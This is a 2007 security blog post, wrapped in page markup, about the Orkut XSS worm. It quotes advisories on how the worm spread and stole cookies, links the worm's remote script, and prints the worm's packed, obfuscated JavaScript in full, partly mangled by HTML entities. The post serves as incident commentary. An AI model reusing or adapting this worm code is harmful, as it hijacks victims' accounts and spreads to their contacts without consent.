<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
    <title> Orkut was hacked ! &middot; Marco Ramilli </title>
    
    <link rel="stylesheet" type="text/css" href="http://marcoramilli.com/css/uno.min.css" />
    <link rel="stylesheet" type="text/css" href="http://marcoramilli.com/css/lightGallery.css" />
    
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://marcoramilli.com/apple-touch-icon-144-precomposed.png">
    <link rel="shortcut icon" href="images/favicon.ico">
    
    <link href="" rel="alternate" type="application/rss+xml" title="Marco Ramilli" />
    
    <script src="http://marcoramilli.com/js/jquery.min.js"></script>
    <script src="http://marcoramilli.com/js/main.min.js">
    </script>
</head>

<body>
  <div id="scriptHeader">
    <span class="mobile btn-mobile-menu">
            <i class="fa fa-bars btn-mobile-menu__icon"></i>
            <i class="fa fa-times btn-mobile-close__icon hidden"> </i>
    </span>
    <header class="
        
            panel-cover panel-cover--collapsed
        "  style="background-image: url(/images/background-cover.jpg)" >
    <div class="panel-main">
        <div class="panel-main__inner panel-inverted">
            <div class="panel-main__content"> 
                <a href="http://marcoramilli.com/" title="link to homepage for Marco Ramilli"> <img src="http://marcoramilli.com/images/MR.jpg" width="80" alt="Marco Ramilli logo" class="panel-cover__logo logo" /> </a> 
                <h1 class="panel-cover__title panel-title">
                    <a href="http://marcoramilli.com/"  title="link to homepage for Marco Ramilli">Marco Ramilli</a>
                </h1>
                <hr class="panel-cover__divider" />
                <p class="panel-cover__description">  cat /dev/random | grep cybersecurity  </p>
                  <hr class="panel-cover__divider panel-cover__divider--secondary" />


                    <div class="navigation-wrapper">
                        <nav class="cover-navigation cover-navigation--primary">
                              <li class="navigation__item"><a href="http://marcoramilli.com/#blog" title="link to Marco Ramilli blog"> <i  class='fa fa-th'></i></a> 
                                  <li class="navigation__item"><a href="http://marcoramilli.com/pages/about" title="About "> <i  class='fa fa-user'></i></a> 
                                  <li class="navigation__item"><a href="http://marcoramilli.com/pages/projects" title="Some of my Projects"> <i  class='fa fa-code-fork'></i></a>  
                                  <li class="navigation__item"><a href="http://marcoramilli.com/pages/publications" title="Selected Publications"> <i class='fa fa-book'> </i></a>  
                        </nav> 
                    </div>
                    <div class="navigation-wrapper">
                        <nav class="cover-navigation navigation--social">
    <ul class="navigation"> 
        
        <li class="navigation__item">
            <a href="http://twitter.com/Marco_Ramilli" title="@Marco_Ramilli on Twitter"> <i class='fa fa-twitter'></i> <span class="label">Twitter</span> </a>
        </li>   
        
        <li class="navigation__item">
            <a href="https://github.com/marcoramilli" title="marcoramilli on github"> <i class='fa fa-github'></i> <span class="label">Github</span> </a>
        </li>  </br>  
        
        <li class="navigation__item">
            <a href="https://www.linkedin.com/in/marcoramilli" title="Linkedin"> <i class='fa fa-linkedin'></i> <span class="label">Linkedin</span> </a>
        </li>  
        
        <li class="navigation__item">
            <a href="mailto:mramilli@gmail.com" title="Email mramilli@gmail.com"> <i class='fa fa-envelope-o'></i> <span class="label">Email</span> </a>
        </li>  </ul>
</nav>
 </div>


            </div>
        </div>
        <div class="panel-cover--overlay"></div>
    </div>
</header>
</div>
<noscript>
    <style>
        #scriptHeader {display:none;}
        .navigation-wrapper{
            display: block;
            top: 0;
        }
    </style>

    <header class="panel-cover panel-cover--collapsed" style="background-image: url(/images/background-cover.jpg)">
        <div class="panel-main">
            <div class="panel-main__inner panel-inverted">
                <div class="panel-main__content"> 
                    <a href="http://marcoramilli.com/" title="link to homepage for Marco Ramilli"> <img src="http://marcoramilli.com/images/MR.jpg" width="80" alt="Marco Ramilli logo" class="panel-cover__logo logo" /> </a> 
                    <h1 class="panel-cover__title panel-title">
                        <a href="http://marcoramilli.com/"  title="link to homepage for Marco Ramilli">Marco Ramilli</a>
                    </h1>
                    <hr class="panel-cover__divider" />
                    <p class="panel-cover__description">  cat /dev/random | grep cybersecurity  </p>
                    <hr class="panel-cover__divider panel-cover__divider--secondary" />
                    <div class="navigation-wrapper">
                        <nav class="cover-navigation cover-navigation--primary">
                            <ul class="navigation">
                              <li class="navigation__item"><a href="http://marcoramilli.com/#blog" title="link to Marco Ramilli blog"> <i  class='fa fa-th'></i></a> </li></br>
                                  <li class="navigation__item"><a href="http://marcoramilli.com/pages/about" title="About "> <i  class='fa fa-user'></i></a> </li></br> 
                                  <li class="navigation__item"><a href="http://marcoramilli.com/pages/projects" title="Some of my Projects"> <i  class='fafa-code-fork'></i></a> </li></br> 
                                  <li class="navigation__item"><a href="http://marcoramilli.com/pages/publications" title="Selected Publications"> <i class='fa fa-book'> </i></a>  
                           </ul>
                        </nav> <nav class="cover-navigation navigation--social">
    <ul class="navigation"> 
        
        <li class="navigation__item">
            <a href="http://twitter.com/Marco_Ramilli" title="@Marco_Ramilli on Twitter"> <i class='fa fa-twitter'></i> <span class="label">Twitter</span> </a>
        </li>   
        
        <li class="navigation__item">
            <a href="https://github.com/marcoramilli" title="marcoramilli on github"> <i class='fa fa-github'></i> <span class="label">Github</span> </a>
        </li>  </br>  
        
        <li class="navigation__item">
            <a href="https://www.linkedin.com/in/marcoramilli" title="Linkedin"> <i class='fa fa-linkedin'></i> <span class="label">Linkedin</span> </a>
        </li>  
        
        <li class="navigation__item">
            <a href="mailto:mramilli@gmail.com" title="Email mramilli@gmail.com"> <i class='fa fa-envelope-o'></i> <span class="label">Email</span> </a>
        </li>  </ul>
</nav>
 </div>
                </div>
            </div>
            <div class="panel-cover--overlay"></div>
        </div>
    </header>
</noscript>

  <div class="content-wrapper">
    <div class="content-wrapper__inner">
      <div class="post">
        <div class="post-meta">
          <span class="post-meta__date date">Dec 20, 2007</span>
          
          <span class="post-meta__tags tags">
            <font class="tags">
              
            </font>
          </span>
          • 500 words 2 min. read
        </div>
        <h1>Orkut was hacked !</h1>
        <section id="post-content" class="article-content post">
          <p>It&rsquo;s amazing understanding the main problems are always the same problems&hellip;. Anyway another XSS Worm but &ldquo;today&rdquo; it fights google company!<br /><br /><img src="http://www.xdisclose.com/images/xdorkutgroupxss.jpg" /><br /><br /><br />Orkut is Google’s version of social networking. It was big for a while, but I think everyone bailed in favor of the more open MySpace and Facebook’s of the world. It’s still widely used by the Portuguese population though.<br /><br />From different <a href="http://packetstormsecurity.org/0612-exploits/XD100098.txt">sources</a>:<br /><br /><blockquote><br />On Orkut, you can use arbitrary HTML when scrapping your friends. Rodrigo&rsquo;s worm exploited this &lsquo;feature&rsquo;. What it did was to start with scrapping a malicious flash file. Just viewing this scrap causes the flash object to load which in turn loads our favourite virus.js file. The Javascript code in that file first joins you in the community called Infectatos pelo Virus do Orkut (in English - Infected by the Orkut Virus) and then sends the same flash file as a scrap to as many people in your friends list as possible. So when each of your friends sees their Scrapbook, they in turn start propagating the worm to their friends, etc.<br /></blockquote><br /><br /><blockquote><br />On November 8th 2006 Rajesh Sethumadhavan discovered a type 2 vulnerability in the social network site Orkut which would make it possible for orkut members to inject HTML and JavaScript into their profile. Rodrigo Lacerda used this vulnerability to create a cookie stealing script known as the Orkut Cookie Exploit which was injected into the orkut profiles of the attacking member(s). By merely viewing these profiles unsuspecting targets had the communities they owned transferred to a fake account of the attacker. On December 12th Orkut had fixed the vulnerability.<br /></blockquote><br /><br />The script is fetched from here: <a href="http://files.myopera.com/virusdoorkut/files/virus.js">http://files.myopera.com/virusdoorkut/files/virus.js</a><br /><br />function $(p,a,c,k,e,d) {<br />   e=function&copy; {<br />       return(c<a?"":e(parseint(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))<br />   };<br />   if(!&ldquo;.replace(/^/,String)){<br />       while(c&ndash;){d[e&copy;]=k[c]||e&copy;}<br />       k=[function(e){return d[e]}];<br />       e=function(){return&rsquo;\w+&lsquo;};<br />       c=1<br />   };<br />   while(c&ndash;){<br />       if(k[c]){<br />           p=p.replace(new RegExp(&rsquo;\b&rsquo;+e&copy;+&rsquo;\b&rsquo;,&lsquo;g&rsquo;),k[c])<br />       }<br />   }<br />   return p<br />};<br />setTimeout(<br />   $(&lsquo;5 j=0;5 q=1q[&ldquo;2o.H&rdquo;];5 E=1q[&ldquo;2p.K.27&rdquo;];7 B(){Z{b i 14(&ldquo;29.1l&rdquo;)}<br />   L(e){};Z{b i 14(&ldquo;2b.1l&rdquo;)}L(e){};Z{b i 2l()}L(e){};b J};<br />   7 W(g,P,m,c,9,U){5 1m=g+&ldquo;=&rdquo;+19(P)+(m?&ldquo;; m=&rdquo;+m.2f():&ldquo;&rdquo;)+(c?&ldquo;; c=&rdquo;+c:&ldquo;&rdquo;)+(9?&ldquo;; 9=&rdquo;+9:&ldquo;&rdquo;)+(U?&ldquo;; U&rdquo;:&ldquo;&rdquo;);<br />   8.y=1m};7 v(g){5 l=8.y;5 A=g+&ldquo;=&rdquo;;5 h=l.S(&ldquo;; &ldquo;+A);6(h==-1){h=l.S(A);6(h!=0){b 2h}}16{h+=2};<br />   5 u=8.y.S(&ldquo;;&rdquo;,h);6(u==-1){u=l.M};b 2j(l.2m(h+A.M,u))};<br />   7 26(g,c,9){6(v(g)){8.y=g+&ldquo;=&rdquo;+(c?&ldquo;; c=&rdquo;+c:&ldquo;&rdquo;)+(9?&ldquo;; 9=&rdquo;+9:&ldquo;&rdquo;)+&ldquo;; m=1u, 1i-1v-1x 1g:1g:1i 1y&rdquo;;1U.1z(0)}};<br />   7 G(){5 3=B();6(3){3.R(&ldquo;1A&rdquo;,&ldquo;o://k.w.p/1B.z&rdquo;,C);3.a(J);3.Y=7(){6(3.X==4){6(3.1a==1c){5 1r=3.1Q;5 t=8.1n(&ldquo;t&rdquo;);<br />   t.1D=1r;5 f=t.D(&ldquo;f&rdquo;).O(0);6(f){f.1M(f.D(&ldquo;1F&rdquo;).O(0));f.1G(&ldquo;1H&rdquo;,&ldquo;N&rdquo;);f.1J.1K=&ldquo;1L&rdquo;;8.1N.1f(f);V()}}16{G()}}};<br />   3.a(J)}};7 T(){5 a=&ldquo;H=&rdquo;+n(q)+&rdquo;&amp;K=&ldquo;+n(E)+&rdquo;&amp;15.1O&rdquo;;5 3=B();3.R(\&lsquo;q\&lsquo;,\&lsquo;o://k.w.p/1P.z?1R=1S\&lsquo;,C);<br />   3.12(\&lsquo;10-1e\&lsquo;,\&lsquo;Q/x-k-17-1b\&lsquo;);3.a(a);3.Y=7(){6(3.X==4){6(3.1a!=1c){T();b};G()}}};<br />   7 V(){6(j==8.18(&ldquo;N&rdquo;).M){b};<br />   5 I=&ldquo;1V 1W 1X&hellip; 1Y 1Z 20 21 22 23 24<1k/>[1j]25 &ldquo;+i F()+&rdquo;[/1j]<1k/><13 1o="\\" 2a="\\" 2e="\\" r="8.1n(\'r\');r.1o="\'o://1p.2k.p/2n/1p/1s.1t\';8.D(\'1w\')[0].1f(r);19(\'\\" 1c="\\" 1e="\\">&rdquo;;<br />   5 a=&ldquo;15.1I=1&amp;H=&ldquo;+n(q)+&rdquo;&amp;I=&ldquo;+n(I)+&rdquo;&amp;K=&ldquo;+n(E)+&rdquo;&amp;1T=&ldquo;+8.18(&ldquo;N&rdquo;).O(j).P;5 3=B();<br />   3.R(&ldquo;q&rdquo;,&ldquo;o://k.w.p/2i.z&rdquo;,C);3.12(&ldquo;10-1e&rdquo;,&ldquo;Q/x-k-17-1b;&rdquo;);<br />   3.a(a);3.Y=7(){6(3.X==4){j++;5 d=i F;d.1d(d.1h()+11);W(\&rsquo;s\&lsquo;,j,d);V()}}};<br />   6(!v(\&rsquo;s\&lsquo;)){5 d=i F;d.1d(d.1h()+11);W(\&rsquo;s\&lsquo;,\&lsquo;0\&lsquo;,d)};j=v(\&rsquo;s\&lsquo;);T();<br />   &lsquo;,62,150,&rsquo;|||xml||var|if|function|document|domain|send|return|path|wDate||select|name|begin|new|index|<br />   www|dc|expires|encodeURIComponent|http|com|POST|script|wormdoorkut|div|end|getCookie|orkut||cookie|aspx<br />   |prefix|createXMLHttpRequest|true|getElementsByTagName|SIG|Date|loadFriends|POST_TOKEN|scrapText|null|<br />   signature|catch|length|selectedList|item|value|application|open|indexOf|cmm_join|secure|sendScrap|setCookie|<br />   readyState|onreadystatechange|try|Content|86400|setRequestHeader|embed|ActiveXObject|Action|else|form|<br />   getElementById|escape|status|urlencoded|200|setTime|Type|appendChild|00|getTime|01|silver|br|XMLHTTP|curCookie|<br />   createElement|src|files|JSHDF|xmlr|virus|js|Thu|Jan|head|70|GMT|go|GET|Compose|width|innerHTML|height|option|<br />   setAttribute|id|submit|style|display|none|removeChild|body|join|CommunityJoin|responseText|cmm|44001818|toUserId|<br />   history|2008|vem|ai|que|ele|comece|mto|bem|para|vc|RL|deleteCookie|raw|LoL|Msxml2|type|Microsoft|shockwave|flash|<br />   wmode|toGMTString|transparent|false|Scrapbook|unescape|myopera<br />   |XMLHttpRequest|substring|virusdoorkut|CGI|Page&rsquo;.split(&lsquo;|&rsquo;),0,{}),1<br />);<br />author=&ldquo;Rodrigo Lacerda&rdquo;<br /></a?"":e(parseint(c/a)))+((c=c%a)><br /><br /><br /><a href="http://paste.uni.cc/17841">Here</a> the complete decoded script.<br />And <a href="http://www.xdisclose.com/XD100098.txt">here</a> the original advisory.<br />And of course try to search something on google about this vulnerability,  you&rsquo;ll be redirected right <a href="http://sb.google.com/safebrowsing/update?version=goog-black-url:1:1">here</a>: the always upgraded google malware list.</p>

        </section>
      </div>
      <div class="sharing">
<a href="https://twitter.com/intent/tweet?status=Orkut%20was%20hacked%20%21-http%3a%2f%2fmarcoramilli.com%2fpost%2forkut-was-hacked-%2f" target="_blank" title="Follow me on Twitter" class="twitter">
<span class="fa fa-twitter-square fa-3x"></span></a>
<a href="https://www.facebook.com/sharer/sharer.php?u=http%3a%2f%2fmarcoramilli.com%2fpost%2forkut-was-hacked-%2f" target="_blank" title="Join me on Facebook" class="facebook">
<span class="fa fa-facebook-square fa-3x"></span></a>
<a href="https://plus.google.com/share?url=http%3a%2f%2fmarcoramilli.com%2fpost%2forkut-was-hacked-%2f" target="_blank" title="Google+" class="googleplus">
<span class="fa fa-google-plus-square fa-3x"></span></a>
<a href="http://www.linkedin.com/shareArticle?mini=true&url=http%3a%2f%2fmarcoramilli.com%2fpost%2forkut-was-hacked-%2f&title=Orkut%20was%20hacked%20%21" target="_blank" title="LinkedIn" class="linkedin">
<span class="fa fa-linkedin-square fa-3x"></span></a>
<a href="http://www.reddit.com/submit?url=http%3a%2f%2fmarcoramilli.com%2fpost%2forkut-was-hacked-%2f" target="_blank" title="Reddit" class="reddit"><span class="fa fa-reddit-square fa-3x"></span></a>
<a href="http://www.stumbleupon.com/submit?url=http%3a%2f%2fmarcoramilli.com%2fpost%2forkut-was-hacked-%2f" target="_blank" title="StumbleUpon" class="stumbleupon"><span class="fa fa-stumbleupon fa-3x">
</span></a>
</div>

      



      <footer class="footer"></footer>

    </div>
  </div>
</body>
<script type="text/javascript" src="http://marcoramilli.com/js/awesome-toc.min.js"></script>
<script type="text/javascript">
$.awesome_toc({        
      title: "Index",
          overlay: true,
              contentId: "post-content",
});
</script>


<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-5633272-11', 'auto');
  ga('send', 'pageview');
</script>


</html>
